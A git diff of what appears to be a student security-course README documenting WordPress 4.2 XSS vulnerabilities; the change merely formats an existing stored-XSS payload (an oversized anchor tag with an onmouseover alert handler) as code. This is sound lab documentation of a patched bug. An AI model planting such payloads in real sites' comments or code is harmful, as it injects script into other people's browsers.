@@ -21,7 +21,7 @@ Time spent: **4** hours spent in total
     - Tested in version: 4.2 (Released on 2015-04-23)
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: ![](https://github.com/mmw5hy/CodepathWeek7/blob/master/big_text_xss.gif)
-  - [ ] Steps to recreate: Copy the text "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>" and replace [64 kb] with over 64 kb of text. The javascript code will be executed when the comment is loaded.
+  - [ ] Steps to recreate: Copy the text ```"<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>"``` and replace [64 kb] with over 64 kb of text. The javascript code will be executed when the comment is loaded.
   - [ ] Affected source code: !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
     - [Link 1]()
 3. Legacy Theme Preview Cross-Site Scripting (XSS)
